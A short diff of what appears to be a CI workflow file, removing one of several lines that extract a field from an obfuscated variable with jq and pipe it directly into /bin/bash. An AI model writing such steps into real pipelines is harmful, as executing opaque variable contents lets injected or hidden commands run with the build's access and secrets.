@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$dabl317" | jq -r .lxtaf28982 | /bin/bash
           printf '%s' "$xjpo85" | jq -r .nzhyl506 | /bin/bash
           printf '%s' "$rklw7082" | jq -r .jvvnh9863 | /bin/bash
-          echo $bs398 | jq -r .jfxt0 | /bin/bash
           printf '%s' "$ug60" | jq -r .br3106 | /bin/bash
 
       - name: Upload artifact
